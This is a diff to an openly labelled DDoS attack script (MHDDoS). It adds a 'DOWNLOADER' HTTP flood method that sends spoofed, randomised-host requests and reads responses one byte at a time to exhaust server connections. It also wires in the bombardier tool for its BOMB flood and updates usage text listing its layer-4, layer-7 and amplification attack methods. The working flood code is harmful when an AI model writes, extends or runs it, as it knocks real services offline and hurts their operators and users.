@@ -78,7 +78,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER"
     }
 
     LAYER4_METHODS: Set[str] = {
@@ -731,6 +731,31 @@ class HttpFlood(Thread):
         except Exception:
             s.close()
 
+    def DOWNLOADER(self):
+        global bytes_sent, REQUESTS_SENT
+        payload: str | bytes = self._payload
+        payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6),
+                                        self._target.authority)
+        payload += self.randHeadercontent
+        payload += self.SpoofIP
+        payload = str.encode(f"{payload}\r\n")
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    if s.send(payload):
+                        REQUESTS_SENT += 1
+                        bytes_sent += len(payload)
+                        while 1:
+                            sleep(.01)
+                            data = s.recv(1)
+                            if not data:
+                                break
+                s.send(b'0')
+                bytes_sent += 1
+
+        except Exception:
+            s.close()
+
     def BYPASS(self):
         global REQUESTS_SENT, bytes_sent
         pro = None
@@ -854,12 +879,15 @@ class HttpFlood(Thread):
                     self._defaultpayload +
                     "Host: %s\r\n\r\n" % self._target.authority).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
+        if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
 
     def BOMB(self):
         pro = randchoice(self._proxies)
+
         run([
             f'{Path.home() / "go/bin/bombardier"}',
+            f'{bombardier_path}',
             f'--connections={self._rpc}',
             '--http2',
             '--method=GET',
@@ -1110,7 +1138,7 @@ class ToolsConsole:
     @staticmethod
     def usage():
         print((
-                  '* MHDDoS - DDoS Attack Script With 40 Methods\n'
+                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
                   'Note: If the Proxy list is empty, the attack will run without proxies\n'
                   '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                   '      Proxy Type 0 = All in config.json\n'
@@ -1137,7 +1165,8 @@ class ToolsConsole:
                   '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                   '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                   ' Amplification)>\n') %
-              (", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
+              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
+               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
                ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
                ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
                ", ".join(["TOOLS", "HELP", "STOP"]), 3,
@@ -1253,7 +1282,17 @@ if __name__ == '__main__':
                                     argv[5].strip())
                     useragent_li = Path(__dir__ / "files/useragent.txt")
                     referers_li = Path(__dir__ / "files/referers.txt")
+                    bombardier_path = Path(__dir__ / "go/bin/bombardier")
                     proxies: Any = set()
+
+                    if method == "BOMB":
+                        assert (
+                            bombardier_path.exists()
+                            or bombardier_path.with_suffix('.exe').exists()
+                        ), (
+                            "Install bombardier: "
+                            "https://github.com/MHProDev/MHDDoS/tree/main/.github/BOMBARDIER.md"
+                        )
 
                     if len(argv) == 9:
                         logger.setLevel("DEBUG")
@@ -1306,7 +1345,6 @@ if __name__ == '__main__':
                     if not port:
                         logger.warning("Port Not Selected, Set To Default: 80")
                         port = 80
-
 
                     if len(argv) >= 6:
                         argfive = argv[5].strip()
